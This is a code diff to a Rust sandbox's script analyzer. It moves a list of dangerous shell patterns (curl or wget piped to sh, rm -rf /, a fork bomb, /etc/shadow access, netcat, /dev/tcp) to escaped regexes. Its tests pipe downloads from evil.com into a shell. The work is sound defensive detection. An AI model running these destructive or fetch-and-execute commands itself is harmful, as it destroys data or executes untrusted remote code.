@@ -28,11 +28,13 @@ use nix::sched::{CloneFlags, unshare};
 use nix::sys::signal::{Signal, kill};
 use nix::sys::wait::{WaitStatus, waitpid};
 use nix::unistd::{ForkResult, Pid, Uid, fork};
+use regex::RegexSet;
 use std::fs::{self, File};
 use std::io::{Read, Write};
 use std::os::unix::fs::PermissionsExt;
 use std::path::{Path, PathBuf};
 use std::process::{Command, Stdio};
+use std::sync::LazyLock;
 use std::time::{Duration, Instant};
 use tempfile::TempDir;
 use tracing::{debug, warn};
@@ -939,37 +941,56 @@ fn set_rlimit(resource: libc::__rlimit_resource_t, value: u64, name: &str) {
     }
 }
 
-/// Dangerous patterns to look for in scripts
+/// Dangerous patterns: (regex, risk level, human description).
+///
+/// All patterns are case-insensitive compiled regexes. Each entry maps to one
+/// danger category. Patterns that previously used ad-hoc `.*` splitting are now
+/// proper regex; special characters (`|`, `*`, `(`, `)`, `{`, `}`, `+`) that
+/// should be treated as literals are escaped with `\`.
 const DANGEROUS_PATTERNS: &[(&str, ScriptRisk, &str)] = &[
     // Critical - remote code execution
+    // Matches: curl <url> | sh  (pipe literal must be escaped)
     (
-        "curl.*|.*sh",
+        r"curl.*\|.*sh",
         ScriptRisk::Critical,
         "Downloads and executes remote code",
     ),
+    // Matches: wget <url> | sh
     (
-        "wget.*|.*sh",
+        r"wget.*\|.*sh",
         ScriptRisk::Critical,
         "Downloads and executes remote code",
     ),
-    ("eval.*$", ScriptRisk::Critical, "Dynamic code execution"),
+    // Matches: eval followed by anything to end of line
+    (r"eval.*$", ScriptRisk::Critical, "Dynamic code execution"),
     // High - system modification
-    ("rm -rf /", ScriptRisk::High, "Recursive deletion of root"),
+    (r"rm -rf /", ScriptRisk::High, "Recursive deletion of root"),
+    // `*` after `/` is a glob in shell but a regex quantifier -- escape it
     (
-        "rm -rf /*",
+        r"rm -rf /\*",
         ScriptRisk::High,
         "Recursive deletion of root contents",
     ),
-    ("mkfs", ScriptRisk::High, "Filesystem formatting"),
-    ("dd if=.* of=/dev/", ScriptRisk::High, "Direct device write"),
-    (":(){ :|:& };:", ScriptRisk::High, "Fork bomb"),
+    (r"mkfs", ScriptRisk::High, "Filesystem formatting"),
+    (r"dd if=.* of=/dev/", ScriptRisk::High, "Direct device write"),
+    // Fork bomb: all special chars must be escaped for literal match
+    (
+        r":\(\)\{ :\|:& \};:",
+        ScriptRisk::High,
+        "Fork bomb",
+    ),
     // Medium - privilege escalation or persistence
     (
-        "chmod.*4[0-7][0-7][0-7]",
+        r"chmod.*4[0-7][0-7][0-7]",
         ScriptRisk::Medium,
         "Setuid bit manipulation",
     ),
-    ("chmod.*u+s", ScriptRisk::Medium, "Setuid bit manipulation"),
+    // `+` is a regex quantifier -- escape for literal `u+s`
+    (
+        r"chmod.*u\+s",
+        ScriptRisk::Medium,
+        "Setuid bit manipulation",
+    ),
     ("crontab", ScriptRisk::Medium, "Cron job modification"),
     ("/etc/shadow", ScriptRisk::Medium, "Password file access"),
     (
@@ -978,37 +999,46 @@ const DANGEROUS_PATTERNS: &[(&str, ScriptRisk, &str)] = &[
         "Sudo configuration access",
     ),
     (
-        "ssh.*authorized_keys",
+        r"ssh.*authorized_keys",
         ScriptRisk::Medium,
         "SSH key manipulation",
     ),
     // Low - potentially suspicious
     (
-        "nc ",
+        r"nc ",
         ScriptRisk::Low,
         "Netcat usage (network backdoor potential)",
     ),
     (
-        "ncat ",
+        r"ncat ",
         ScriptRisk::Low,
         "Ncat usage (network backdoor potential)",
     ),
     (
-        "/dev/tcp/",
+        r"/dev/tcp/",
         ScriptRisk::Low,
         "Bash TCP device (network comms)",
     ),
     (
-        "/dev/udp/",
+        r"/dev/udp/",
         ScriptRisk::Low,
         "Bash UDP device (network comms)",
     ),
     (
-        "base64.*-d",
+        r"base64.*-d",
         ScriptRisk::Low,
         "Base64 decoding (obfuscation)",
     ),
 ];
+
+/// Compiled `RegexSet` for all dangerous-pattern regexes (case-insensitive).
+///
+/// Built once at program startup via `LazyLock`. The index into the set
+/// corresponds 1-to-1 with the index into `DANGEROUS_PATTERNS`.
+static DANGEROUS_REGEX_SET: LazyLock<RegexSet> = LazyLock::new(|| {
+    let patterns: Vec<&str> = DANGEROUS_PATTERNS.iter().map(|(p, _, _)| *p).collect();
+    RegexSet::new(&patterns).expect("DANGEROUS_PATTERNS contains an invalid regex")
+});
 
 /// Analyze a script for dangerous patterns
 pub fn analyze_script(content: &str) -> ScriptAnalysis {
@@ -1016,18 +1046,13 @@ pub fn analyze_script(content: &str) -> ScriptAnalysis {
     let mut recommendations = Vec::new();
     let mut max_risk = ScriptRisk::Safe;
 
-    let content_lower = content.to_lowercase();
-
-    for (pattern, risk, description) in DANGEROUS_PATTERNS {
-        // Simple pattern matching (could be improved with regex)
-        let pattern_lower = pattern.to_lowercase();
-        if content_lower.contains(&pattern_lower)
-            || (pattern.contains(".*") && fuzzy_match(&content_lower, &pattern_lower))
-        {
-            patterns.push(format!("{} ({})", description, risk.as_str()));
-            if *risk > max_risk {
-                max_risk = *risk;
-            }
+    // RegexSet::matches() returns the indices of all matching patterns in one pass.
+    let matches = DANGEROUS_REGEX_SET.matches(content);
+    for idx in matches.iter() {
+        let (_, risk, description) = &DANGEROUS_PATTERNS[idx];
+        patterns.push(format!("{} ({})", description, risk.as_str()));
+        if *risk > max_risk {
+            max_risk = *risk;
         }
     }
 
@@ -1053,31 +1078,6 @@ pub fn analyze_script(content: &str) -> ScriptAnalysis {
         patterns,
         recommendations,
     }
-}
-
-/// Simple fuzzy pattern matching for .* patterns
-fn fuzzy_match(content: &str, pattern: &str) -> bool {
-    if !pattern.contains(".*") {
-        return content.contains(pattern);
-    }
-
-    let parts: Vec<&str> = pattern.split(".*").collect();
-    if parts.is_empty() {
-        return false;
-    }
-
-    let mut pos = 0;
-    for part in parts {
-        if part.is_empty() {
-            continue;
-        }
-        if let Some(found) = content[pos..].find(part) {
-            pos += found + part.len();
-        } else {
-            return false;
-        }
-    }
-    true
 }
 
 /// Check if namespace isolation is available
@@ -1156,10 +1156,21 @@ mod tests {
     }
 
     #[test]
-    fn test_fuzzy_match() {
-        assert!(fuzzy_match("curl http://evil.com | sh", "curl.*|.*sh"));
-        assert!(fuzzy_match("wget http://evil.com | bash", "wget.*|.*sh"));
-        assert!(!fuzzy_match("echo hello", "curl.*|.*sh"));
+    fn test_regex_pipe_to_shell() {
+        // curl/wget piped to a shell -- Critical patterns
+        let curl_sh = analyze_script("curl http://evil.com | sh");
+        assert_eq!(curl_sh.risk, ScriptRisk::Critical);
+
+        let wget_sh = analyze_script("wget http://evil.com | bash");
+        assert_eq!(wget_sh.risk, ScriptRisk::Critical);
+
+        // Sanity: plain echo must NOT trigger the pipe-to-shell pattern
+        let safe = analyze_script("echo hello");
+        assert_eq!(safe.risk, ScriptRisk::Safe);
+
+        // False-positive guard: a URL ending in "sh" with no pipe must not match
+        let just_curl = analyze_script("curl https://example.com/install.sh -o /tmp/x");
+        assert_ne!(just_curl.risk, ScriptRisk::Critical);
     }
 
     #[test]
